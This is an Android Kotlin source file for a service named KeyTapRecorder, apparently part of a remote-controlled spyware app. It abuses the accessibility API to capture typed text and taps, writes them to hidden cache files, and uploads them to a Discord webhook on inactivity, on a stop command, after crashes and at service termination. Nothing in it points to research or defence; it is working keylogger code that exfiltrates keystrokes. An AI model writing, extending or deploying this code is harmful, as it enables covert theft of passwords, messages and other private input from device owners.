package com.example.dronzer

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import android.os.Handler
import android.os.Looper

class KeyTapRecorder : AccessibilityService() {

    private var logFile: File? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())
    private val timeoutMillis = 60000L // 30 seconds

    private val sendRunnable = Runnable {
        sendLogsAndReset(">> Key Taps Log (30s inactivity)")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("KeyTapRecorder", "Accessibility Service Connected")
        // Check for any logs that weren't sent due to a crash or kill
        checkAndRecoverLogs()
    }

    override fun onStartCommand(intent: android.content.Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        when (action) {
            "START_RECORDING" -> {
                if (!isRecording) {
                    isRecording = true
                    initLogFile()
                    Log.d("KeyTapRecorder", "Started Recording")
                }
            }
            "STOP_RECORDING" -> {
                if (isRecording) {
                    isRecording = false
                    handler.removeCallbacks(sendRunnable)
                    sendLogsAndReset(">> Key Taps Log (Stopped by command)")
                    Log.d("KeyTapRecorder", "Stopped Recording")
                }
            }
        }
        return START_STICKY
    }

    private fun initLogFile() {
        val cacheDir = applicationContext.cacheDir
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        // Added 'rec_' prefix to align with DronzerService's general recovery sweep
        logFile = File(cacheDir, "rec_keytaps_$timestamp.txt")
        if (!logFile!!.exists()) {
            logFile!!.createNewFile()
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isRecording) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            
            val text = event.text.toString()
            if (text.isNotEmpty() && text != "[]") {
                appendToLog(text)
                resetTimer()
            }
        }
    }

    private fun appendToLog(text: String) {
        try {
            if (logFile == null) initLogFile()
            FileOutputStream(logFile, true).use { fos ->
                val entry = "[${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}] $text\n"
                fos.write(entry.toByteArray())
            }
        } catch (e: Exception) {
            Log.e("KeyTapRecorder", "Error writing to log: ${e.message}")
        }
    }

    private fun resetTimer() {
        handler.removeCallbacks(sendRunnable)
        handler.postDelayed(sendRunnable, timeoutMillis)
    }

    private fun checkAndRecoverLogs() {
        val cacheDir = applicationContext.cacheDir
        val files = cacheDir.listFiles { file ->
            file.name.startsWith("rec_keytaps_") && file.length() > 0
        }
        
        if (files != null && files.isNotEmpty()) {
            Log.d("KeyTapRecorder", "Found ${files.size} unsent logs. Recovering...")
            for (file in files) {
                // If it's the current file, we don't want to upload it while typing
                if (logFile != null && file.absolutePath == logFile!!.absolutePath) continue
                
                DiscordManager.sendFileToWebhook(file, ">> Recovered Key Taps Log") { success, error ->
                    if (success) file.delete()
                }
            }
        }
    }

    private fun sendLogsAndReset(message: String) {
        val fileToSend = logFile
        if (fileToSend != null && fileToSend.exists() && fileToSend.length() > 0) {
            Log.d("KeyTapRecorder", "Sending logs to Discord...")
            DiscordManager.sendFileToWebhook(fileToSend, message) { success, error ->
                if (success) {
                    fileToSend.delete()
                    if (isRecording) initLogFile() // Start a new file for the next session
                } else {
                    Log.e("KeyTapRecorder", "Failed to send log: $error")
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Final attempt to send logs if the service is being destroyed/killed
        if (isRecording) {
            sendLogsAndReset(">> Key Taps Log (Service Termination Recovery)")
        }
        handler.removeCallbacks(sendRunnable)
    }

    override fun onInterrupt() {
        Log.w("KeyTapRecorder", "Service Interrupted")
    }
}
